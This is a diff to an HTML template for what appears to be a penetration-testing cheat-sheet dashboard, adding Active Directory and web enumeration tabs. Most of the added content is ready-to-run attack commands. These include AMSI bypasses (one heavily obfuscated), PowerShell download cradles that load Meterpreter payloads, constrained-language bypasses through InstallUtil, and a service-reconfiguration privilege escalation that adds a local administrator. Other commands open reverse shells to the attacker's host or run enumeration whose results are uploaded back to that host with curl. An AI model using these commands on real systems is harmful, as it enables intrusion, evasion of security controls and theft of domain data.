@@ -86,7 +86,8 @@ uitloggen
     <ul class="dropdown-menu">
       <li><a href="#tab8" data-toggle="tab">Shells & Payloads</a>
       <li><a href="#tab9" data-toggle="tab">Commands</a></li>
-        <li><a href="#tab9" data-toggle="tab">Basic manual</a></li>
+        <li><a href="#tab10" data-toggle="tab">Enummeration AD</a></li>
+        <li><a href="#tab11" data-toggle="tab">Enummeration WEB</a></li>
         <li><a href="#tab9" data-toggle="tab">Flask admin</a></li>
     </ul>
   </li>
@@ -220,13 +221,34 @@ sessions
 <pre>curl -F file=@FILENAME {{appdata.localhost}}/upload</pre>
 <p>Upgrading shell...</p>
 <pre>python -c'import pty; pty.spawn("/bin/bash")'</pre>
-<p>Upgrading shell...</p>
-<pre></pre>
+
+<p>InviShell</p>
+
+<pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/user.bat -o c:\windows\tasks\user.bat & c:\windows\tasks\user.bat</pre>
+
+
+<p>PsBypassCLM.exe</p>
+<pre>curl {{appdata.localhost}}/tools/PsBypassCLM.exe -o c:\windows\tasks\PsBypassCLM.exe & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\windows\tasks\PsBypassCLM.exe</pre>
+
+<p>Amsi bypass Meterpreter 443</p>
+<pre>powershell -e {{ "IEX ((New-Object Net.WebClient).DownloadString('[host]/payloads/amsi-bypass.ps1'));" | winbas64}}</pre>
+
+<p>Amsi bypass shell 443</p>
+<pre>powershell -e {{ "IEX ((New-Object Net.WebClient).DownloadString('[host]/payloads/amsi-shell.ps1'));" | winbas64}}</pre>
+
 
 <p>Basic injection</p>
 <pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
-<p>Basic injection II</p>
-<pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
+
+<p>Powershell encoded</p
+<pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/methtcp.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
+
+<p>Basic injection Meterpreter port 8080</p>
+<pre>$data = (New-Object System.Net.WebClient).DownloadData('{{appdata.localhost}}/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)</pre>
+
+<p>Powershell encoded</p
+<pre>powershell -e {{ "$data = (New-Object System.Net.WebClient).DownloadData('[host]/payloads/meth8080.exe');$assem = [System.Reflection.Assembly]::Load($data);[meth.Program]::Main(1)" | winbas64}}</pre>
+
 
 
 <h4>More stuff generated with ./reverseshells.sh</h4>
@@ -241,6 +263,133 @@ sessions
   {{x | inhoudweergeven(1) | safe}}
 {% endfor %}
 </div>
+
+<div class="tab-pane fade" id="tab10">
+<h1>Enummeration AD</h1>
+<p>Constrained language</p>
+
+<pre>$ExecutionContext.SessionState.LanguageMode</pre>
+
+<p>Basic bypass</p>
+<pre>
+$CurrTemp = $env:temp
+$CurrTmp = $env:tmp
+$TEMPBypassPath = "C:\windows\temp"
+$TMPBypassPath = "C:\windows\temp"
+
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
+
+Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
+sleep 5
+
+#Set it back
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
+Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp       
+</pre>
+<p>Obfuscated String Reorder</p>
+<pre>   
+(("{80}{106}{34}{40}{49}{45}{120}{29}{125}{124}{65}{87}{90}{70}{110}{41}{71}{112}{118}{96}{69}{8}{82}{103}{122}{119}{21}{14}{117}{5}{51}{55}{24}{94}{95}{83}{98}{88}{84}{53}{105}{99}{6}{31}{73}{32}{33}{77}{78}{23}{50}{48}{17}{109}{25}{111}{9}{100}{115}{104}{97}{37}{62}{102}{63}{75}{1}{22}{93}{66}{27}{57}{7}{44}{4}{38}{56}{26}{60}{30}{101}{13}{18}{52}{10}{114}{68}{3}{43}{86}{19}{15}{92}{108}{89}{59}{12}{76}{20}{123}{81}{46}{0}{35}{107}{16}{58}{36}{116}{113}{47}{61}{74}{72}{85}{67}{121}{54}{42}{79}{64}{2}{39}{28}{11}{91}"-f'1 -Nam','l',' -Value ','#S','lass w','hTMPB','v','nvoke-WmiMeth','C:A','Path','hell.exefkI','rr','kcu:AZM','I','kI4','Property-','rrTm','assP','Pow','tem','viron','tempf','uefkI45hTMPB','fkI4','=','-ItemPr','ocess -N','I','hCu','env:t','-Argume','ir','-N','a','em','e Tmp -V','Se','ntMW','in32','45','p','45hT','','et it ba','od -C',' 45','W','rope','EMPByp','=','5hT','ypassPa','ers','emProperty -Path ','tMW1','th ','_pr','I','p','MW1h','ame create ','r','1 -N','emp -','emp','rrTm','Pathfk','cu:',' 5','I',':tm','EMPBy','1h','onmentMW1 ','ty -Path MW','Va','En','me Tmp -','Value','-Name T','45','tM','Z','Mwi','Set-It','k','ckSet-I','p = 45he','','h ','nv','Temp','P','ypass',' fkIC:A','Z','th = fk','ronme','ndowsAZMtempfkI','1hkcu:AZMEn',' ','ntList fk','ame T','Mwi','vi','MW','hCurrT','alue 45hCu','at','athfkISet','p','operty -','p','mP','sleep','MW1hkcu:AZMEn','t-Ite','5','assPa','sAZM','h','AZMEnvironmen','ndow','men','hCu','emp45')).ReplaCE('MW1',[STRiNg][CHAR]39).ReplaCE('fkI',[STRiNg][CHAR]34).ReplaCE('45h','$').ReplaCE(([CHAR]65+[CHAR]90+[CHAR]77),'\') |& ( $pshoMe[4]+$pSHOme[34]+'X')</pre>
+
+<p>PsBypassCLM.exe</p>
+<pre>curl {{appdata.localhost}}/tools/PsBypassCLM.exe -o c:\windows\tasks\PsBypassCLM.exe & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\windows\tasks\PsBypassCLM.exe</pre>
+
+
+<pre>curl {{appdata.localhost}}/tools/PsBypassCLM.exe -o c:\windows\tasks\PsBypassCLM.exe & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost={{appdata.localhost | zet_ip}} /rport=443 /U C:\windows\tasks\PsBypassCLM.exe</pre>
+
+<p>InviShell</p>
+
+<pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/user.bat -o c:\windows\tasks\user.bat & c:\windows\tasks\user.bat</pre>
+
+
+
+<h4>Basic Privesc</h4>
+<p>PowerUp.ps1</p>
+<pre>powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PowerUp.ps1');Invoke-AllChecks> PowerUp_$(iex hostname);curl.exe -F file=@PowerUp_$(iex hostname) {{appdata.localhost}}/upload/"</pre>
+
+<p>PrivescCheck.ps1</p>
+<pre>IEX ((New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PrivescCheck.ps1'));Invoke-PrivescCheck -Extended -Report PrivescCheck_$(iex hostname);curl.exe -F file=@PrivescCheck_$(iex hostname).txt {{appdata.localhost}}/upload/</pre>
+
+<p>SNMPTRAP</p>
+<pre>
+sc config SNMPTRAP obj= "NT AUTHORITY\SYSTEM" password= ""
+sc config snmptrap binpath= "C:\Windows\System32\net.exe localgroup Administrators jan-karel /add"
+</pre>
+<p>Always Install elevated</p>
+<pre>
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</pre>
+
+
+<p>Find-PSRemotingLocalAdminAccess.ps1</p>
+<pre>powershell -exec Bypas
+</pre>
+
+<p>Invoke-PowerShellTcp.ps1</p>
+<pre>    
+powershell.exe -c iex "((New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress {{appdata.localhost | zet_ip}} -Port 443"
+</pre>
+<p>of....</p>
+
+<pre>
+powershell.exe iex "(iwr http://{{appdata.localhost}}/tools/Invoke-PowerShellTcp.ps1 - UseBasicParsing);Power -Reverse -IPAddress {{appdata.localhost | zet_ip}} -Port 443"
+</pre>
+
+<h4>Basic AD Enummeration</h4>
+<p><strong>Powerview.ps1</strong> basic amsibypass & loads powerview plus returns data with curl</p>
+<pre>$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);IEX ((New-Object Net.WebClient).DownloadString('{{appdata.localhost}}/tools/PowerView.ps1'));echo "hostname:" > $(iex hostname);hostname >> $(iex hostname);echo "ipconfig:" >> $(iex hostname);ipconfig >> $(iex hostname);echo "whoami:" >> $(iex hostname);whoami >> $(iex hostname);echo "whoami /priv:" >> $(iex hostname);whoami /priv >> $(iex hostname);echo "whomai /groups:" >> $(iex hostname);whoami /groups >> $(iex hostname);echo "net group Domain Computers /domain:" >> $(iex hostname);net group "Domain Computers" /domain >> $(iex hostname);echo "net group Domain Admins /domain:" >> $(iex hostname);net group "Domain Admins" /domain >> $(iex hostname);echo "Get-DomainUser:" >> $(iex hostname);Get-DomainUser >> $(iex hostname);echo "Get-DomainUser -SPN:" >> $(iex hostname);Get-DomainUser -SPN >> $(iex hostname);echo "Get-DomainComputer:" >> $(iex hostname);Get-DomainComputer | select -ExpandProperty dnshostname >> $(iex hostname);echo "Get-DomainGroup -Identity Domain Admins:" >> $(iex hostname);Get-DomainGroup -Identity "Domain Admins" >> $(iex hostname);echo "DomainOU" >> $(iex hostname);Get-DomainOU >> $(iex hostname);echo "DomainGPO" >> $(iex hostname);Get-DomainGPO >> $(iex hostname);echo "Get-DomainTrust" >> $(iex hostname);Get-DomainTrust >> $(iex hostname);echo "Get-NetComputer -UnConstrained" >> $(iex hostname);Get-NetComputer -UnConstrained >> $(iex hostname);echo "Get-NetUser -TrustedToAuth" >> $(iex hostname);Get-NetUser -TrustedToAuth >> $(iex hostname);echo "Get-NetComputer -TrustedToAuth" >> $(iex hostname);Get-NetComputer -TrustedToAuth >> $(iex hostname);curl.exe -F file=@$(iex hostname) {{appdata.localhost}}/upload/</pre>
+<p>More PowerView enummeratation</p>
+<p>Invoke-ShareFinder</p>
+<p>InviShell & microsoft</p>
+
+<pre>curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/invisi.dll -o c:\windows\tasks\invisi.dll & curl {{appdata.localhost}}/tools/enum.bat -o c:\windows\tasks\enum.bat & c:\windows\tasks\enum.bat</pre>
+
+
+
+
+
+
+
+</div>
+
+
+
+<div class="tab-pane fade" id="tab11">
+<h1>Enummeration WEB</h1>
+<p>Constrained language</p>
+
+<pre></pre>
+
+
+Invoke-Command -ComputerName dcorp-dc -ScriptBlock { Get-ChildItem C:\ } -credential $credential
+
+
+<h4>Basic Privesc</h4>
+
+
+
+<h4>Privesc</h4>
+
+
+<h4>Remoting</h4>
+
+<p></p>
+
+<pre>Invoke-Command -ComputerName dcorp-dc -ScriptBlock { Get-ChildItem C:\ } -credential $credential</pre>
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
 </div>
 </div>
 </div>
